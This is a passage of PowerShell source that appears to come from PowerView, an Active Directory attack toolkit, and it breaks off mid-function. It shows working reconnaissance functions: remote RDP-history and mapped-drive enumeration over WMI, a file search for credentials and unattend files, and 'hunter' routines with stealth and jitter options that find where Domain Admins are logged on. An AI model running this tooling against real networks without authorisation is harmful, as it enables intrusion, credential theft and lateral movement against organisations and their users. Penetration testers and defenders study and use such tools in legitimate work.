        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        $Credential
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $HKU = 2147483651

    try {
        if($Credential) {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -ErrorAction SilentlyContinue
        }

        
        $UserSIDs = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

        foreach ($UserSID in $UserSIDs) {

            try {
                $UserName = Convert-SidToName $UserSID

                
                $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                foreach ($Connection in $ConnectionKeys) {
                    
                    if($Connection -match 'MRU.*') {
                        $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue
                        
                        $FoundConnection = New-Object PSObject
                        $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                        $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                        $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                        $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                        $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                        $FoundConnection
                    }
                }

                
                $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                foreach ($Server in $ServerKeys) {

                    $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue
                    
                    $FoundConnection = New-Object PSObject
                    $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                    $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                    $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                    $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                    $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                    $FoundConnection   
                }

            }
            catch {
                Write-Verbose "Error: $_"
            }
        }

    }
    catch {
        Write-Warning "Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
    }
}


filter Get-RegistryMountedDrive {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        $Credential
    )

    
    $Computer = $ComputerName | Get-NameField

    
    $HKU = 2147483651

    try {
        if($Credential) {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -Credential $Credential -ErrorAction SilentlyContinue
        }
        else {
            $Reg = Get-WmiObject -List 'StdRegProv' -Namespace root\default -Computername $Computer -ErrorAction SilentlyContinue
        }

        
        $UserSIDs = ($Reg.EnumKey($HKU, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

        foreach ($UserSID in $UserSIDs) {

            try {
                $UserName = Convert-SidToName $UserSID

                $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                ForEach($DriveLetter in $DriveLetters) {
                    $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                    $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                    $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                    if(-not $UserName) { $UserName = '' }

                    if($RemotePath -and ($RemotePath -ne '')) {
                        $MountedDrive = New-Object PSObject
                        $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                        $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                        $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                        $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
                        $MountedDrive | Add-Member Noteproperty 'ProviderName' $ProviderName
                        $MountedDrive | Add-Member Noteproperty 'RemotePath' $RemotePath
                        $MountedDrive | Add-Member Noteproperty 'DriveUserName' $DriveUserName
                        $MountedDrive
                    }
                }
            }
            catch {
                Write-Verbose "Error: $_"
            }
        }
    }
    catch {
        Write-Warning "Error accessing $Computer, likely insufficient permissions or firewall rules on host: $_"
    }
}


filter Get-NetProcess {


    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [Object[]]
        [ValidateNotNullOrEmpty()]
        $ComputerName = [System.Net.Dns]::GetHostName(),

        [Management.Automation.PSCredential]
        $Credential
    )

    
    $Computer = $ComputerName | Get-NameField

    try {
        if($Credential) {
            $Processes = Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential
        }
        else {
            $Processes = Get-WMIobject -Class Win32_process -ComputerName $ComputerName
        }

        $Processes | ForEach-Object {
            $Owner = $_.getowner();
            $Process = New-Object PSObject
            $Process | Add-Member Noteproperty 'ComputerName' $Computer
            $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
            $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
            $Process | Add-Member Noteproperty 'Domain' $Owner.Domain
            $Process | Add-Member Noteproperty 'User' $Owner.User
            $Process                
        }
    }
    catch {
        Write-Verbose "[!] Error enumerating remote processes on $Computer, access likely denied: $_"
    }
}


function Find-InterestingFile {

    
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',

        [Alias('Terms')]
        [String[]]
        $SearchTerms = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config'),

        [Switch]
        $OfficeDocs,

        [Switch]
        $FreshEXEs,

        [String]
        $LastAccessTime,

        [String]
        $LastWriteTime,

        [String]
        $CreationTime,

        [Switch]
        $ExcludeFolders,

        [Switch]
        $ExcludeHidden,

        [Switch]
        $CheckWriteAccess,

        [String]
        $OutFile,

        [Switch]
        $UsePSDrive
    )

    begin {

        $Path += if(!$Path.EndsWith('\')) {"\"}

        if ($Credential) {
            $UsePSDrive = $True
        }

        
        $SearchTerms = $SearchTerms | ForEach-Object { if($_ -notmatch '^\*.*\*$') {"*$($_)*"} else{$_} }

        
        if ($OfficeDocs) {
            $SearchTerms = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }

        
        if($FreshEXEs) {
            
            $LastAccessTime = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $SearchTerms = '*.exe'
        }

        if($UsePSDrive) {
            

            $Parts = $Path.split('\')
            $FolderPath = $Parts[0..($Parts.length-2)] -join '\'
            $FilePath = $Parts[-1]

            $RandDrive = ("abcdefghijklmnopqrstuvwxyz".ToCharArray() | Get-Random -Count 7) -join ''
            
            Write-Verbose "Mounting path '$Path' using a temp PSDrive at $RandDrive"

            try {
                $Null = New-PSDrive -Name $RandDrive -PSProvider FileSystem -Root $FolderPath -ErrorAction Stop
            }
            catch {
                Write-Verbose "Error mounting path '$Path' : $_"
                return $Null
            }

            
            $Path = "${RandDrive}:\${FilePath}"
        }
    }

    process {

        Write-Verbose "[*] Search path $Path"

        function Invoke-CheckWrite {
            
            [CmdletBinding()]param([String]$Path)
            try {
                $Filetest = [IO.FILE]::OpenWrite($Path)
                $Filetest.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }

        $SearchArgs =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $SearchTerms
            'ErrorAction' = 'SilentlyContinue'
        }

        Get-ChildItem @SearchArgs | ForEach-Object {
            Write-Verbose $_
            
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | ForEach-Object {
            
            if((-not $CheckWriteAccess) -or (Invoke-CheckWrite -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {
            
            if($OutFile) {Export-PowerViewCSV -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }

    end {
        if($UsePSDrive -and $RandDrive) {
            Write-Verbose "Removing temp PSDrive $RandDrive"
            Get-PSDrive -Name $RandDrive -ErrorAction SilentlyContinue | Remove-PSDrive -Force
        }
    }
}








function Invoke-ThreadedFunction {
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,

        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,

        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,

        [Int]
        [ValidateRange(1,100)] 
        $Threads = 20,

        [Switch]
        $NoImports
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        Write-Verbose "[*] Total number of hosts: $($ComputerName.count)"

        
        
        $SessionState = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $SessionState.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()

        
        
        if(!$NoImports) {

            
            $MyVars = Get-Variable -Scope 2

            
            $VorbiddenVars = @("?","args","ConsoleFileName","Error","ExecutionContext","false","HOME","Host","input","InputObject","MaximumAliasCount","MaximumDriveCount","MaximumErrorCount","MaximumFunctionCount","MaximumHistoryCount","MaximumVariableCount","MyInvocation","null","PID","PSBoundParameters","PSCommandPath","PSCulture","PSDefaultParameterValues","PSHOME","PSScriptRoot","PSUICulture","PSVersionTable","PWD","ShellId","SynchronizedHash","true")

            
            ForEach($Var in $MyVars) {
                if($VorbiddenVars -NotContains $Var.Name) {
                $SessionState.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            
            ForEach($Function in (Get-ChildItem Function:)) {
                $SessionState.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $Function.Name, $Function.Definition))
            }
        }

        
        
        

        
        $Pool = [runspacefactory]::CreateRunspacePool(1, $Threads, $SessionState, $Host)
        $Pool.Open()

        $method = $null
        ForEach ($m in [PowerShell].GetMethods() | Where-Object { $_.Name -eq "BeginInvoke" }) {
            $methodParameters = $m.GetParameters()
            if (($methodParameters.Count -eq 2) -and $methodParameters[0].Name -eq "input" -and $methodParameters[1].Name -eq "output") {
                $method = $m.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
    }

    process {

        ForEach ($Computer in $ComputerName) {

            
            if ($Computer -ne '') {
                

                While ($($Pool.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }

                
                $p = [powershell]::create()

                $p.runspacepool = $Pool

                
                $Null = $p.AddScript($ScriptBlock).AddParameter('ComputerName', $Computer)
                if($ScriptParameters) {
                    ForEach ($Param in $ScriptParameters.GetEnumerator()) {
                        $Null = $p.AddParameter($Param.Name, $Param.Value)
                    }
                }

                $o = New-Object Management.Automation.PSDataCollection[Object]

                $Jobs += @{
                    PS = $p
                    Output = $o
                    Result = $method.Invoke($p, @($null, [Management.Automation.PSDataCollection[Object]]$o))
                }
            }
        }
    }

    end {
        Write-Verbose "Waiting for threads to finish..."

        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
        } While (($Jobs | Where-Object { ! $_.Result.IsCompleted }).Count -gt 0)

        ForEach ($Job in $Jobs) {
            $Job.PS.Dispose()
        }

        $Pool.Dispose()
        Write-Verbose "All threads completed!"
    }
}


function Invoke-UserHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [Switch]
        $Unconstrained,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $AdminCount,

        [Switch]
        $AllowDelegation,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [Switch]
        $Stealth,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All",

        [Switch]
        $ForeignUsers,

        [Int]
        [ValidateRange(1,100)]
        $Threads,

        [UInt32]
        $Poll = 0
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        Write-Verbose "[*] Running Invoke-UserHunter with delay of $Delay"

        
        
        
        
        

        if($ComputerFile) {
            
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [Array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain).name )
            }
            
            if($Stealth) {
                Write-Verbose "Stealth mode! Enumerating commonly used servers"
                Write-Verbose "Stealth source: $StealthSource"

                ForEach ($Domain in $TargetDomains) {
                    if (($StealthSource -eq "File") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for File Servers..."
                        $ComputerName += Get-NetFileServer -Domain $Domain -DomainController $DomainController
                    }
                    if (($StealthSource -eq "DFS") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for DFS Servers..."
                        $ComputerName += Get-DFSshare -Domain $Domain -DomainController $DomainController | ForEach-Object {$_.RemoteServerName}
                    }
                    if (($StealthSource -eq "DC") -or ($StealthSource -eq "All")) {
                        Write-Verbose "[*] Querying domain $Domain for Domain Controllers..."
                        $ComputerName += Get-NetDomainController -LDAP -Domain $Domain -DomainController $DomainController | ForEach-Object { $_.dnshostname}
                    }
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for hosts"

                    $Arguments = @{
                        'Domain' = $Domain
                        'DomainController' = $DomainController
                        'ADSpath' = $ADSpath
                        'Filter' = $ComputerFilter
                        'Unconstrained' = $Unconstrained
                    }

                    $ComputerName += Get-NetComputer @Arguments
                }
            }

            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }

        if ($Poll -gt 0) {
            Write-Verbose "[*] Polling for $Poll seconds. Automatically enabling threaded mode."
            if ($ComputerName.Count -gt 100) {
                throw "Too many hosts to poll! Try fewer than 100."
            }
            $Threads = $ComputerName.Count
        }

        
        
        
        
        

        
        $TargetUsers = @()

        
        $CurrentUser = ([Environment]::UserName).toLower()

        
        if($ShowAll -or $ForeignUsers) {
            $User = New-Object PSObject
            $User | Add-Member Noteproperty 'MemberDomain' $Null
            $User | Add-Member Noteproperty 'MemberName' '*'
            $TargetUsers = @($User)

            if($ForeignUsers) {
                
                $krbtgtName = Convert-ADName -ObjectName "krbtgt@$($Domain)" -InputType Simple -OutputType NT4
                $DomainShortName = $krbtgtName.split("\")[0]
            }
        }
        
        elseif($TargetServer) {
            Write-Verbose "Querying target server '$TargetServer' for local users"
            $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                $User = New-Object PSObject
                $User | Add-Member Noteproperty 'MemberDomain' ($_.AccountName).split("/")[0].toLower() 
                $User | Add-Member Noteproperty 'MemberName' ($_.AccountName).split("/")[1].toLower() 
                $User
            }  | Where-Object {$_}
        }
        
        elseif($UserName) {
            Write-Verbose "[*] Using target user '$UserName'..."
            $User = New-Object PSObject
            if($TargetDomains) {
                $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
            }
            else {
                $User | Add-Member Noteproperty 'MemberDomain' $Null
            }
            $User | Add-Member Noteproperty 'MemberName' $UserName.ToLower()
            $TargetUsers = @($User)
        }
        
        elseif($UserFile) {
            $TargetUsers = Get-Content -Path $UserFile | ForEach-Object {
                $User = New-Object PSObject
                if($TargetDomains) {
                    $User | Add-Member Noteproperty 'MemberDomain' $TargetDomains[0]
                }
                else {
                    $User | Add-Member Noteproperty 'MemberDomain' $Null
                }
                $User | Add-Member Noteproperty 'MemberName' $_
                $User
            }  | Where-Object {$_}
        }
        elseif($UserADSpath -or $UserFilter -or $AdminCount) {
            ForEach ($Domain in $TargetDomains) {

                $Arguments = @{
                    'Domain' = $Domain
                    'DomainController' = $DomainController
                    'ADSpath' = $UserADSpath
                    'Filter' = $UserFilter
                    'AdminCount' = $AdminCount
                    'AllowDelegation' = $AllowDelegation
                }

                Write-Verbose "[*] Querying domain $Domain for users"
                $TargetUsers += Get-NetUser @Arguments | ForEach-Object {
                    $User = New-Object PSObject
                    $User | Add-Member Noteproperty 'MemberDomain' $Domain
                    $User | Add-Member Noteproperty 'MemberName' $_.samaccountname
                    $User
                }  | Where-Object {$_}

            }
        }
        else {
            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController
            }
        }

        if (( (-not $ShowAll) -and (-not $ForeignUsers) ) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
            throw "[!] No users found to search for!"
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName, $Poll, $Delay, $Jitter)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                $Timer = [System.Diagnostics.Stopwatch]::StartNew()
                $RandNo = New-Object System.Random

                Do {
                    if(!$DomainShortName) {
                        
                        $Sessions = Get-NetSession -ComputerName $ComputerName
                        ForEach ($Session in $Sessions) {
                            $UserName = $Session.sesi10_username
                            $CName = $Session.sesi10_cname

                            if($CName -and $CName.StartsWith("\\")) {
                                $CName = $CName.TrimStart("\")
                            }

                            
                            if (($UserName) -and ($UserName.trim() -ne '') -and (!($UserName -match $CurrentUser))) {

                                $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                    $IPAddress = @(Get-IPAddress -ComputerName $ComputerName)[0].IPAddress
                                    $FoundUser = New-Object PSObject
                                    $FoundUser | Add-Member Noteproperty 'UserDomain' $_.MemberDomain
                                    $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                                    $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName
                                    $FoundUser | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $FoundUser | Add-Member Noteproperty 'SessionFrom' $CName

                                    
                                    try {
                                        $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                        $FoundUser | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                    }
                                    catch {
                                        $FoundUser | Add-Member NoteProperty 'SessionFromName' $Null
                                    }

                                    
                                    if ($CheckAccess) {
                                        $Admin = Invoke-CheckLocalAdminAccess -ComputerName $CName
                                        $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $FoundUser.PSObject.TypeNames.Add('PowerView.UserSession')
                                    $FoundUser
                                }
                            }
                        }
                    }
                    if(!$Stealth) {
                        
                        $LoggedOn = Get-NetLoggedon -ComputerName $ComputerName
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.wkui1_username
                            
                            
                            $UserDomain = $User.wkui1_logon_domain

                            
                            if (($UserName) -and ($UserName.trim() -ne '')) {

                                $TargetUsers | Where-Object {$UserName -like $_.MemberName} | ForEach-Object {

                                    $Proceed = $True
                                    if($DomainShortName) {
                                        if ($DomainShortName.ToLower() -ne $UserDomain.ToLower()) {
                                            $Proceed = $True
                                        }
                                        else {
                                            $Proceed = $False
                                        }
                                    }
                                    if($Proceed) {
                                        $IPAddress = @(Get-IPAddress -ComputerName $ComputerName)[0].IPAddress
                                        $FoundUser = New-Object PSObject
                                        $FoundUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                                        $FoundUser | Add-Member Noteproperty 'UserName' $UserName
                                        $FoundUser | Add-Member Noteproperty 'ComputerName' $ComputerName
                                        $FoundUser | Add-Member Noteproperty 'IPAddress' $IPAddress
                                        $FoundUser | Add-Member Noteproperty 'SessionFrom' $Null
                                        $FoundUser | Add-Member Noteproperty 'SessionFromName' $Null

                                        
                                        if ($CheckAccess) {
                                            $Admin = Invoke-CheckLocalAdminAccess -ComputerName $ComputerName
                                            $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                        }
                                        else {
                                            $FoundUser | Add-Member Noteproperty 'LocalAdmin' $Null
                                        }
                                        $FoundUser.PSObject.TypeNames.Add('PowerView.UserSession')
                                        $FoundUser
                                    }
                                }
                            }
                        }
                    }

                    if ($Poll -gt 0) {
                        Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                    }
                } While ($Poll -gt 0 -and $Timer.Elapsed.TotalSeconds -lt $Poll)
            }
        }
    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'DomainShortName' = $DomainShortName
                'Poll' = $Poll
                'Delay' = $Delay
                'Jitter' = $Jitter
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
                $Result = Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $Computer, $False, $TargetUsers, $CurrentUser, $Stealth, $DomainShortName, 0, 0, 0
                $Result

                if($Result -and $StopOnSuccess) {
                    Write-Verbose "[*] Target user found, returning early"
                    return
                }
            }
        }

    }
}


function Invoke-StealthUserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $CheckAccess,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [String]
        [ValidateSet("DFS","DC","File","All")]
        $StealthSource ="All"
    )
    
    Invoke-UserHunter -Stealth @PSBoundParameters
}


function Invoke-ProcessHunter {


    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,

        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,

        [String]
        $ComputerFilter,

        [String]
        $ComputerADSpath,

        [String]
        $ProcessName,

        [String]
        $GroupName = 'Domain Admins',

        [String]
        $TargetServer,

        [String]
        $UserName,

        [String]
        $UserFilter,

        [String]
        $UserADSpath,

        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,

        [Switch]
        $StopOnSuccess,

        [Switch]
        $NoPing,

        [UInt32]
        $Delay = 0,

        [Double]
        $Jitter = .3,

        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $ShowAll,

        [Switch]
        $SearchForest,

        [ValidateRange(1,100)] 
        [Int]
        $Threads,

        [Management.Automation.PSCredential]
        $Credential
    )

    begin {

        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }

        
        $RandNo = New-Object System.Random

        Write-Verbose "[*] Running Invoke-ProcessHunter with delay of $Delay"

        
        
        
        
        

        
        if($ComputerFile) {
            $ComputerName = Get-Content -Path $ComputerFile
        }

        if(!$ComputerName) { 
            [array]$ComputerName = @()

            if($Domain) {
                $TargetDomains = @($Domain)
            }
            elseif($SearchForest) {
                
                $TargetDomains = Get-NetForestDomain -DomainController $DomainController -Credential $Credential | ForEach-Object { $_.Name }
            }
            else {
                
                $TargetDomains = @( (Get-NetDomain -Domain $Domain -Credential $Credential).name )
            }

            ForEach ($Domain in $TargetDomains) {
                Write-Verbose "[*] Querying domain $Domain for hosts"
                $ComputerName += Get-NetComputer -Domain $Domain -DomainController $DomainController -Credential $Credential -Filter $ComputerFilter -ADSpath $ComputerADSpath
            }
        
            
            $ComputerName = $ComputerName | Where-Object { $_ } | Sort-Object -Unique | Sort-Object { Get-Random }
            if($($ComputerName.Count) -eq 0) {
                throw "No hosts found!"
            }
        }

        
        
        
        
        

        if(!$ProcessName) {
            Write-Verbose "No process name specified, building a target user set"

            
            $TargetUsers = @()

            
            if($TargetServer) {
                Write-Verbose "Querying target server '$TargetServer' for local users"
                $TargetUsers = Get-NetLocalGroup $TargetServer -Recurse | Where-Object {(-not $_.IsGroup) -and $_.IsDomain } | ForEach-Object {
                    ($_.AccountName).split("/")[1].toLower()
                }  | Where-Object {$_}
            }
            
            elseif($UserName) {
                Write-Verbose "[*] Using target user '$UserName'..."
                $TargetUsers = @( $UserName.ToLower() )
            }
            
            elseif($UserFile) {
                $TargetUsers = Get-Content -Path $UserFile | Where-Object {$_}
            }
            elseif($UserADSpath -or $UserFilter) {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users"
                    $TargetUsers += Get-NetUser -Domain $Domain -DomainController $DomainController -Credential $Credential -ADSpath $UserADSpath -Filter $UserFilter | ForEach-Object {
                        $_.samaccountname
                    }  | Where-Object {$_}
                }
            }
            else {
                ForEach ($Domain in $TargetDomains) {
                    Write-Verbose "[*] Querying domain $Domain for users of group '$GroupName'"
                    $TargetUsers += Get-NetGroupMember -GroupName $GroupName -Domain $Domain -DomainController $DomainController -Credential $Credential| ForEach-Object {
                        $_.MemberName
                    }
                }
            }

            if ((-not $ShowAll) -and ((!$TargetUsers) -or ($TargetUsers.Count -eq 0))) {
                throw "[!] No users found to search for!"
            }
        }

        
        $HostEnumBlock = {
            param($ComputerName, $Ping, $ProcessName, $TargetUsers, $Credential)

            
            $Up = $True
            if($Ping) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $ComputerName
            }
            if($Up) {
                
                
                $Processes = Get-NetProcess -Credential $Credential -ComputerName $ComputerName -ErrorAction SilentlyContinue

                ForEach ($Process in $Processes) {
                    
                    if($ProcessName) {
                        $ProcessName.split(",") | ForEach-Object {
                            if ($Process.ProcessName -match $_) {
                                $Process
                            }
                        }
                    }
                    
                    elseif ($TargetUsers -contains $Process.User) {
                        $Process
                    }
                }
            }
        }

    }

    process {

        if($Threads) {
            Write-Verbose "Using threading with threads = $Threads"

            
            $ScriptParams = @{
                'Ping' = $(-not $NoPing)
                'ProcessName' = $ProcessName
                'TargetUsers' = $TargetUsers
                'Credential' = $Credential
            }

            
            Invoke-ThreadedFunction -ComputerName $ComputerName -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }

        else {
            if(-not $NoPing -and ($ComputerName.count -ne 1)) {
                
                $Ping = {param($ComputerName) if(Test-Connection -ComputerName $ComputerName -Count 1 -Quiet -ErrorAction Stop){$ComputerName}}
                $ComputerName = Invoke-ThreadedFunction -NoImports -ComputerName $ComputerName -ScriptBlock $Ping -Threads 100
            }

            Write-Verbose "[*] Total number of active hosts: $($ComputerName.count)"
            $Counter = 0

            ForEach ($Computer in $ComputerName) {

                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose "[*] Enumerating server $Computer ($Counter of $($ComputerName.count))"
